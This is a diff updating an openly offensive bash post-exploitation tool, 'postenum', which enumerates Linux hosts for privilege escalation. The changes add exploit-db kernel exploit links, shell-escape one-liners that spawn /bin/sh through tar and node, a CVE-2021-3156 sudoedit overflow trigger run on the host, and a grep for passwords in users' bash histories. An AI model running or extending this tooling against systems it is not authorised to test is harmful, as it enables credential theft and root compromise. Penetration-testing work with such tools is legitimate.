@@ -1,8 +1,8 @@
 #!/bin/bash
-
+clear
 # License: MIT
 
-# Version 1.1
+# Version 1.2
 
 # Linux enumeration and privilege escalation tool.
 # Be more than a normal user. Be the ROOT.
@@ -22,12 +22,12 @@ echo "
                  _                             
  _ __   ___  ___| |_ ___ _ __  _   _ _ __ ___  
 | '_ \ / _ \/ __| __/ _ \ '_ \| | | | '_ ' _ \ 
-| |_) | (_) \__ \ ||  __/ | | | |_| | | | | | |  version : 1.1
+| |_) | (_) \__ \ ||  __/ | | | |_| | | | | | |  version : 1.2
 | .__/ \___/|___/\__\___|_| |_|\__,_|_| |_| |_|
 |_| 
 
 "$white
-echo "POST-EXPLOITATION Tool$grnintensy by Mostapha Bahadou"$white
+echo "POST-EXPLOITATION Tool$grnintensy by @mostaphabahadou"$white
 echo $whiteboldintensy"----------------------------------------------------------------------------"$white
 echo ""
 echo " postenum - be the ROOT"
@@ -43,6 +43,8 @@ function Exploits1x(){
 	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
 	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
 	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
+	echo "$redintensy Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
+	echo "$redintensy Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass$white - https://www.exploit-db.com/exploits/44299"
 }
 
 function Exploits2x(){
@@ -59,6 +61,8 @@ function Exploits2x(){
 	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
 	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
 	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
+	echo "$redintensy Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
+	echo "$redintensy Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass$white - https://www.exploit-db.com/exploits/44299"
 }
 
 function Exploits3x(){
@@ -73,6 +77,8 @@ function Exploits3x(){
 	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
 	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
 	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
+	echo "$redintensy Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
+	echo "$redintensy Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass$white - https://www.exploit-db.com/exploits/44299"
 }
 
 function Exploits4x(){
@@ -91,11 +97,14 @@ function Exploits4x(){
 	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (polkit Method)$white - https://www.exploit-db.com/exploits/47167"
 	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (cron Method)$white - https://www.exploit-db.com/exploits/47164"
 	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
+	echo "$redintensy Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset'$white - https://www.exploit-db.com/exploits/44300"
+	echo "$redintensy Linux Kernel 4.13 (Ubuntu 17.10) - 'waitid()' SMEP/SMAP/Chrome Sandbox$white - https://www.exploit-db.com/exploits/43127"
 }
 
 function Exploits5x(){
 	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
 	echo "$redintensy Linux 5.3$white - https://www.exploit-db.com/exploits/47779"
+	echo "$redintensy Linux 5.3 - Privilege Escalation via io_uring Offload of sendmsg() onto Kernel Thread with Kernel Creds$white - https://www.exploit-db.com/exploits/47779"
 }
 
 function OperatingSystem(){
@@ -158,6 +167,20 @@ function OperatingSystem(){
 		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
 	fi
 
+	echo $cyan"[+] - Check mounted partitions:"$white
+	echo $yellowintensy"[x] Mounted partitions:"$white
+	LSBLK=$(lsblk 2>/dev/null)
+	if [ "$LSBLK" ];
+	then
+		echo -e "$LSBLK\n"
+	else
+		echo -e "None -> Probably needs more privileges(sudo), the command 'lsblk' not found or empty outpu!\tn"
+	fi
+	echo ""
+}
+
+function KernelExploits(){
+	echo $boldgrn"[-] KERNEL EXPLOITS"$white
 	echo $cyan"[+] - Exploits:"$white
 	underversion2=2.0.0
 	kernel=$(uname -a | cut -d " " -f "3" | cut -d "-" -f "1")
@@ -183,7 +206,7 @@ function OperatingSystem(){
 				cat exploit.txt
 				shred -n 5 -u -z exploit.txt
 			else
-				echo "No accurate exploit, for kernel $kernel - use google search!"
+				echo "No accurate exploit, for kernel $kernel - use manual approaches (Google, Searchsploit)"
 			fi
 		else
 			echo "Nothing here! But don't give up."
@@ -214,7 +237,7 @@ function OperatingSystem(){
 					cat exploit.txt
 					shred -n 5 -u -z exploit.txt
 				else
-					echo "No accurate exploit, for kernel $kernel - use google search!"
+					echo "No accurate exploit, for kernel $kernel - use manual approaches (Google, Searchsploit)"
 				fi
 			else
 				echo "Nothing here! But don't give up."
@@ -245,7 +268,7 @@ function OperatingSystem(){
 						cat exploit.txt
 						shred -n 5 -u -z exploit.txt
 					else
-						echo "No accurate exploit, for kernel $kernel - use google search!"
+						echo "No accurate exploit, for kernel $kernel - use manual approaches (Google, Searchsploit)"
 					fi
 				else
 					echo "Nothing here! But don't give up."
@@ -274,7 +297,7 @@ function OperatingSystem(){
 							cat exploit.txt
 							shred -n 5 -u -z exploit.txt
 						else
-							echo "No accurate exploit, for kernel $kernel - use google search!"
+							echo "No accurate exploit, for kernel $kernel - use manual approaches (Google, Searchsploit)"
 						fi
 					else
 						echo "Nothing here! But don't give up."
@@ -303,7 +326,7 @@ function OperatingSystem(){
 								cat exploit.txt
 								shred -n 5 -u -z exploit.txt
 							else
-								echo "No accurate exploit, for kernel $kernel - use google search!"
+								echo "No accurate exploit, for kernel $kernel - use manual approaches (Google, Searchsploit)"
 							fi
 						else
 							echo "Nothing here! But don't give up."
@@ -505,6 +528,15 @@ function CommAndNet(){
 		echo -e "None -> Probably needs more privileges(sudo), the command 'sestatus' not found or empty output!\n"
 	fi
 
+	echo $yellowintensy"[x] Execshield enabled:"$white
+	Execshield=$(grep "exec-shield" /etc/sysctl.conf)
+	if [ "$Execshield" ];
+	then
+		echo -e "$Execshield\n"
+	else
+		echo -e "None -> Probably needs more privileges(sudo), the 'exec-shield' not found in /etc/sysctl.conf or empty output!\n"
+	fi
+
 	echo $yellowintensy"[x] Packet filter rules:"$white
 	IPTABLE=$(iptables -L 2>/dev/null)
 	if [ "$IPTABLE" ];
@@ -623,8 +655,8 @@ function ConfidentialInfoAndUser(){
 		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
 	fi
 
-	echo $yellowintensy"[x] From /etc/passwd - /bin/bash /bin/sh /bin/dash:"$white
-	PASSWD=$(cat /etc/passwd | grep "/bin/bash\|/bin/sh\|/bin/dash" 2>/dev/null)
+	echo $yellowintensy"[x] From /etc/passwd - /bin/bash /bin/sh /bin/zsh /bin/dash:"$white
+	PASSWD=$(cat /etc/passwd | grep "/bin/bash\|/bin/sh\|/bin/dash\|/bin/zsh" 2>/dev/null)
 	if [ "$PASSWD" ];
 	then
 		echo -e "$PASSWD\n"
@@ -803,6 +835,15 @@ function ConfidentialInfoAndUser(){
 	if [ "$ROOTHISTORY" ];
 	then
 		echo -e $redintensy"$ROOTHISTORY\n"$white
+	else
+		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
+	fi
+
+	echo $yellowintensy"[x] Grep passwd from .bash_history:"$white
+	GREPPASSWDHISTORY=$(grep passwd /home/*/.bash_history 2>/dev/null)
+	if [ "$GREPPASSWDHISTORY" ];
+	then
+		echo -e $redintensy"$GREPPASSWDHISTORY\n"$white
 	else
 		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
 	fi
@@ -996,6 +1037,15 @@ function FileSystem(){
 	if [ -d /var/www/html ];
 	then
 		echo -e "$HTML\n"
+	else
+		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
+	fi
+
+	echo $yellowintensy"[x] Any interesting file/folder in /var/tmp - no cleanup after reboot:"$white
+	VARTMP=$(for x in "/var/tmp"; do ls -lh "$x"; done 2>/dev/null)
+	if [ -d /var/tmp ];
+	then
+		echo -e "$VARTMP\n"
 	else
 		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
 	fi
@@ -1246,6 +1296,15 @@ function FileSystem(){
 		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
 	fi
 
+	echo $yellowintensy"[x] Easy World-writable files - 2:"$white
+	EASYFILEWRITABLE=$(find / -perm -2 -type f 2>/dev/null)
+	if [ "$EASYFILEWRITABLE" ];
+	then
+		echo -e "$EASYFILEWRITABLE\n"
+	else
+		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
+	fi
+
 	echo $cyan"[+] - Check for readable logfiles owned by root:"$white
 	echo $yellowintensy"[x] World-readable logfiles - 0004:"$white
 	LOGFILES=$(find /var/log -type f -perm -0004 -user root -exec ls -l {} \; 2>/dev/null)
@@ -1400,6 +1459,14 @@ function DevToolsAndLang(){
 		:
 	fi
 
+	socat=$(command -v socat 2>/dev/null)
+	if [ "$SOCAT" ];
+	then
+		echo "$SOCAT"
+	else
+		:
+	fi
+
 	WGET=$(command -v wget 2>/dev/null)
 	if [ "$WGET" ];
 	then
@@ -1428,6 +1495,14 @@ function DevToolsAndLang(){
 	if [ "$ELINKS" ];
 	then
 		echo "$ELINKS"
+	else
+		:
+	fi
+
+	AXEL=$(command -v axel 2>/dev/null)
+	if [ "$AXEL" ];
+	then
+		echo "$AXEL"
 	else
 		:
 	fi
@@ -1471,7 +1546,12 @@ function DevToolsAndLang(){
 	echo "tar    =	tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
 	echo "tar    =	tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
 	echo ""
-	echo $redintensy" ** Please note that we can replace 'sh' with 'bash'**"$white
+	echo "node   =	node -e 'var exec = require(\"child_process\").exec;
+exec(\"id\", function (error, stdOut, stdErr) {
+    console.log(stdOut);
+});'"
+	echo ""
+	echo $redintensy" ** NOTE that you can replace 'sh' with 'bash'**"$white
 	echo ""
 
 	echo $cyan"[+] - List all Environment Variables:"$white
@@ -1500,11 +1580,16 @@ function SoftwareVersion(){
 	SUDOVER=$(sudo -V | grep -i "version" | grep "Sudo " 2>/dev/null)
 	if [ "$SUDOVER" ];
 	then
-		echo $yellowintensy"[x] Sudo version (<= 1.8.20):"$white
+		echo $yellowintensy"[x] Sudo version:"$white
 		echo -e "$SUDOVER\n"
+
 	else
 		echo -e "None -> Probably needs more privileges(sudo), the command 'sudo' not found or empty output!\n"
 	fi
+
+	echo $yellowintensy"[x] CVE-2021-3156 check:"$white
+	sudoedit -s '\' `perl -e 'print "A" x 65536'`
+	echo -e $redintensy"If you receive a usage or error message, sudo is not vulnerable. If the result is a Segmentation fault, sudo is vulnerable.\n"$white
 
 	echo $yellowintensy"[x] MYSQL version:"$white
 	MYSQLVER=$(mysql -V 2>/dev/null)
@@ -1690,7 +1775,8 @@ function Usage(){
 	echo "	-c :	Interesting [Backup files, PasswordPolicy, SSH files, etc.]"
 	echo "	-n :	Network settings [DNS, ARP, Host, TCP, UDP, etc.]"
 	echo "	-p :	Services and cron jobs"
-	echo "	-o :	OS informations and priv esc kernel exploits"
+	echo "	-o :	OS informations, drivers and defenses"
+	echo "	-x :	Privlege escalation kernel exploits"
 	echo "	-v :	Sofware's versions"
 	echo "	-t :	Fstab credentials and database access"
 	echo ""
@@ -1754,7 +1840,13 @@ function Postenum(){
 											clear
 											TryingAccess
 										else
-											Usage
+											if [ "$OPTIONS" == "-x" ] || [ "$OPTIONS" == "x" ];
+											then
+												clear
+												KernelExploits
+											else
+												Usage
+											fi
 										fi
 									fi
 								fi
